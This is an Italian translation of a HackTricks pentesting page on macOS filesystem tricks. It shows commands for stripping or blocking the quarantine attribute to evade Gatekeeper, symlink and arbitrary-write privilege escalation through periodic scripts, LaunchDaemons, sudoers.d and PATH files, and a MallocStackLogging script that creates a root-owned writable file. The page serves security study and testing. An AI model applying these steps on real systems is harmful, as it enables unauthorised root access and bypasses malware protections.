# Trucchi macOS FS

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

## Combinazioni di autorizzazioni POSIX

Autorizzazioni in una **directory**:

* **lettura** - puoi **enumerare** le voci della directory
* **scrittura** - puoi **eliminare/scrivere** **file** nella directory e puoi **eliminare cartelle vuote**.
* Ma **non puoi eliminare/modificare cartelle non vuote** a meno che tu abbia le autorizzazioni di scrittura su di esse.
* **Non puoi modificare il nome di una cartella** a meno che tu ne sia il proprietario.
* **esecuzione** - ti è **permesso attraversare** la directory - se non hai questo diritto, non puoi accedere a nessun file al suo interno, o in eventuali sottodirectory.

### Combinazioni Pericolose

**Come sovrascrivere un file/cartella di proprietà di root**, ma:

* Un **proprietario della directory genitore** nel percorso è l'utente
* Un **proprietario della directory genitore** nel percorso è un **gruppo di utenti** con **accesso in scrittura**
* Un **gruppo di utenti** ha **accesso in scrittura** al **file**

Con una qualsiasi delle combinazioni precedenti, un attaccante potrebbe **iniettare** un **link simbolico/hard** nel percorso previsto per ottenere una scrittura arbitraria privilegiata.

### Caso Speciale Folder root R+X

Se ci sono file in una **directory** in cui **solo root ha accesso R+X**, questi non sono **accessibili a nessun altro**. Quindi una vulnerabilità che permette di **spostare un file leggibile da un utente**, che non può essere letto a causa di tale **restrizione**, da questa cartella **a un'altra**, potrebbe essere sfruttata per leggere questi file.

Esempio in: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Collegamento simbolico / Collegamento fisico

Se un processo privilegiato sta scrivendo dati in un **file** che potrebbe essere **controllato** da un **utente meno privilegiato**, o che potrebbe essere **precedentemente creato** da un utente meno privilegiato. L'utente potrebbe semplicemente **puntarlo su un altro file** tramite un collegamento simbolico o fisico, e il processo privilegiato scriverà su quel file.

Controlla nelle altre sezioni dove un attaccante potrebbe **abusare di una scrittura arbitraria per ottenere privilegi**.

## .fileloc

I file con estensione **`.fileloc`** possono puntare ad altre applicazioni o binari in modo che quando vengono aperti, l'applicazione/binario sarà quello eseguito.\
Esempio:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## FD Arbitrario

Se riesci a fare in modo che un **processo apra un file o una cartella con privilegi elevati**, puoi abusare di **`crontab`** per aprire un file in `/etc/sudoers.d` con **`EDITOR=exploit.py`**, in modo che `exploit.py` possa ottenere l'FD al file all'interno di `/etc/sudoers` e abusarlo.

Ad esempio: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Trucchi per Evitare gli xattrs di Quarantena

### Rimuovilo
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### Flag uchg / uchange / uimmutable

Se un file/cartella ha questo attributo immutabile, non sarà possibile aggiungere un xattr ad esso.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Montaggio di defvfs

Un **montaggio devfs** **non supporta xattr**, ulteriori informazioni in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### ACL di writeextattr

Questa ACL impedisce di aggiungere `xattrs` al file
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Il formato file **AppleDouble** copia un file inclusi i suoi ACE.

Nel [**codice sorgente**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) è possibile vedere che la rappresentazione testuale ACL memorizzata all'interno dell'xattr chiamato **`com.apple.acl.text`** verrà impostata come ACL nel file decompresso. Quindi, se hai compresso un'applicazione in un file zip con il formato file **AppleDouble** con un ACL che impedisce ad altri xattr di essere scritti su di esso... l'xattr di quarantena non è stato impostato nell'applicazione:

Controlla il [**rapporto originale**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) per ulteriori informazioni.

Per replicare questo, prima dobbiamo ottenere la stringa acl corretta:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Nota che anche se questo funziona, la sandbox scrive l'xattr di quarantena prima)

Non proprio necessario ma lo lascio lì nel caso:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## Ignorare le Firme dei Codici

I Bundle contengono il file **`_CodeSignature/CodeResources`** che contiene l'**hash** di ogni singolo **file** nel **bundle**. Nota che l'hash di CodeResources è anche **incorporato nell'eseguibile**, quindi non possiamo intaccarlo.

Tuttavia, ci sono alcuni file la cui firma non verrà verificata, questi hanno la chiave omit nel plist, come:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
È possibile calcolare la firma di una risorsa dalla riga di comando con:

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Montare dmgs

Un utente può montare un file dmg personalizzato anche sopra alcune cartelle esistenti. Ecco come potresti creare un pacchetto dmg personalizzato con contenuti personalizzati:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

Di solito macOS monta il disco parlando con il servizio Mach `com.apple.DiskArbitrarion.diskarbitrariond` (fornito da `/usr/libexec/diskarbitrationd`). Se si aggiunge il parametro `-d` al file LaunchDaemons plist e si riavvia, verranno memorizzati i log in `/var/log/diskarbitrationd.log`.\
Tuttavia, è possibile utilizzare strumenti come `hdik` e `hdiutil` per comunicare direttamente con il kext `com.apple.driver.DiskImages`.

## Scritture Arbitrarie

### Script sh periodici

Se il tuo script potrebbe essere interpretato come uno **script shell**, potresti sovrascrivere lo script shell **`/etc/periodic/daily/999.local`** che verrà attivato ogni giorno.

Puoi **simulare** l'esecuzione di questo script con: **`sudo periodic daily`**

### Daemon

Scrivi un **LaunchDaemon** arbitrario come **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** con un plist che esegue uno script arbitrario come:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
### File Sudoers

Se si dispone di **scrittura arbitraria**, è possibile creare un file all'interno della cartella **`/etc/sudoers.d/`** concedendosi i privilegi **sudo**.

### File PATH

Il file **`/etc/paths`** è uno dei principali file che popolano la variabile di ambiente PATH. È necessario essere root per sovrascriverlo, ma se uno script di un **processo privilegiato** sta eseguendo un **comando senza il percorso completo**, potresti essere in grado di **intercettarlo** modificando questo file.

È anche possibile scrivere file in **`/etc/paths.d`** per caricare nuove cartelle nella variabile di ambiente `PATH`.

## Generare file scrivibili come altri utenti

Questo genererà un file che appartiene a root ed è scrivibile da me ([**codice da qui**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). Questo potrebbe funzionare anche come privesc:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## Memoria Condivisa POSIX

**La memoria condivisa POSIX** consente ai processi nei sistemi operativi conformi a POSIX di accedere a un'area di memoria comune, facilitando una comunicazione più veloce rispetto ad altri metodi di comunicazione tra processi. Coinvolge la creazione o l'apertura di un oggetto di memoria condivisa con `shm_open()`, impostandone la dimensione con `ftruncate()`, e mappandolo nello spazio di indirizzamento del processo utilizzando `mmap()`. I processi possono quindi leggere direttamente da questa area di memoria e scriverci. Per gestire l'accesso concorrente e prevenire la corruzione dei dati, vengono spesso utilizzati meccanismi di sincronizzazione come mutex o semafori. Infine, i processi scollegano e chiudono la memoria condivisa con `munmap()` e `close()`, e facoltativamente rimuovono l'oggetto di memoria con `shm_unlink()`. Questo sistema è particolarmente efficace per IPC efficiente e veloce in ambienti in cui più processi devono accedere rapidamente a dati condivisi.

<details>

<summary>Esempio di Codice del Produttore</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Esempio di codice per consumatori</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## Descrittori Protetti di macOS

I **descrittori protetti di macOS** sono una funzionalità di sicurezza introdotta in macOS per migliorare la sicurezza e l'affidabilità delle **operazioni sui descrittori di file** nelle applicazioni utente. Questi descrittori protetti forniscono un modo per associare restrizioni specifiche o "guardie" ai descrittori di file, che sono applicate dal kernel.

Questa funzionalità è particolarmente utile per prevenire determinate classi di vulnerabilità della sicurezza come **l'accesso non autorizzato ai file** o le **condizioni di gara**. Queste vulnerabilità si verificano, ad esempio, quando un thread sta accedendo a una descrizione del file dando **accesso a un altro thread vulnerabile su di esso** o quando un descrittore di file viene **ereditato** da un processo figlio vulnerabile. Alcune funzioni correlate a questa funzionalità sono:

* `guarded_open_np`: Apre un FD con una guardia
* `guarded_close_np`: Chiudilo
* `change_fdguard_np`: Cambia i flag della guardia su un descrittore (anche rimuovendo la protezione della guardia)

## Riferimenti

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>Impara l'hacking su AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
